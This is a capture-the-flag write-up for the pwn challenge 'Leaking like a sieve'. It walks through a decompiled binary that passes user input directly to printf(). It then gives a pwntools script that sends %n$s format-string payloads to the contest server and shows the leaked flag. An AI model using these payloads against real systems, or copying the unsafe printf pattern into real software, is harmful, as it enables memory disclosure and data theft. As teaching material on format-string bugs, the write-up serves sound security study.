# Leaking like a sieve

## Category
pwn

## Points
Dynamically allocated starting at 500, ending at 100

## Description
This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?

Author: xXl33t_h@x0rXx

`nc pwn-2021.duc.tf 31918`

Files: `hellothere`

## Keywords
pwntools, Ghidra, printf

## Notes
Calling the server asked for our name, and then echoed it back at us. It looked like this would go on forever, so I hit Ctrl-C to stop it:
```
$ nc pwn-2021.duc.tf 31918
What is your name?
Fred

Hello there, Fred

What is your name?
Jim

Hello there, Jim

What is your name?
^C
```

I opened the executable in Ghidra, and looked at the `main()` function:
```c
void main(void)
{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_58 [32];
  char local_38 [40];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  buffer_init();
  __stream = fopen("./flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts(
        "The flag file isn\'t loading. Please contact an organiser if you are running this on the shell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_38,0x20,__stream);
  do {
    puts("What is your name?");
    fgets(local_58,0x20,stdin);
    printf("\nHello there, ");
    printf(local_58);
    putchar(10);
  } while( true );
}
```

Here we can see two arrays - `local_58` and `local_38`. The user's input is stored in `local_58`. Since it uses `fgets()` to get the user input, it would be difficult to overflow this buffer, and as the flag is loaded into `local_38`, we don't want to overwrite that!

One thing we can see is that the buffer is passed to `printf()` without a format string. A usual call to `printf` would be something like: `printf("%d\n", x);` where the value of `x` would replace the `%d` in the format string (`%d` is a placeholder for a signed decimal integer). If we didn't specify `x`, `printf()` would try to fulfil its format specifiers from memory.

As there is no format string when our name is printed out, we can specify one in our input, and this can expose items on the stack to us for reading and even writing to.

I have [some notes on printf()](../General-Notes/printf.md), but this is a relatively simple exploit. We simply want to read a string from the stack. `%s` is used to treat parameters as strings, so we can just try printing strings from various positions in the stack and see if it is our flag.

In `printf()`, we can change which parameter applies to a format string with `%n$`. For example:
```c
  printf("%3$d, %2$d, %1$d\n", 7, 8, 9);
```
would output:
```
9, 8, 7
```

So by specifying our format specifier of `%n$s` and having no parameters, we can print out any strings in various memory locations. By putting this in a loop, we can plough through memory printing out strings.

> *Note*: various items on the stack may not be printable strings, and may crash the program. If you get a segmentation fault, just try another location

I wrote a Python script with `pwntools` to test this:
```python
from pwn import *

# 10 locations is probably enough for this test
for i in range(1, 11):
  print(f"Attempt with: {i}")

  # Test against the server
  p = remote('pwn-2021.duc.tf', 31918)

  # Get the question and print it
  line = p.recvline()
  print(line)

  # Create our string to output strings from memory
  send_str = f"%{i}$s"
  print(f"Sending {send_str}")
  p.sendline(send_str)

  # Output whatever we get back
  line = p.recv()
  print(line)

  # Close the connection and restart, as we may have had a
  # segmentation fault
  p.close()
```

Running this against the server gives us the output:
```
$ python3 get_flag.py 
Attempt with: 1
b'What is your name?\n'
Sending %1$s
b'\nHello there, \nHello there, \n\nWhat is your name?\n'
Attempt with: 2
b'What is your name?\n'
Sending %2$s
b'\nHello there, \n\nWhat is your name?\n'
Attempt with: 3
b'What is your name?\n'
Sending %3$s
b'\nHello there, (null)\n\nWhat is your name?\n'
Attempt with: 4
b'What is your name?\n'
Sending %4$s
b'\nHello there, '
Attempt with: 5
b'What is your name?\n'
Sending %5$s
b'\nHello there, \xc0\x94\xab\xder\x7f\n\nWhat is your name?\n'
Attempt with: 6
b'What is your name?\n'
Sending %6$s
b'\nHello there, DUCTF{f0rm4t_5p3c1f13r_m3dsg!}\n\nWhat is your name?\n'
Attempt with: 7
b'What is your name?\n'
Sending %7$s
b'\nHello there, \x98$\xad\xfb\n\nWhat is your name?\n'
Attempt with: 8
b'What is your name?\n'
Sending %8$s
b'\nHello there, '
Attempt with: 9
b'What is your name?\n'
Sending %9$s
b'\nHello there, '
Attempt with: 10
b'What is your name?\n'
Sending %10$s
b'\nHello there, '
```

We can see when we send `%6$s` we get the flag!

We can get the same result manually, now we know the location, by answering `%6$s` to the question:
```
$ nc pwn-2021.duc.tf 31918
What is your name?
%6$s

Hello there, DUCTF{f0rm4t_5p3c1f13r_m3dsg!}

What is your name?
^C
```

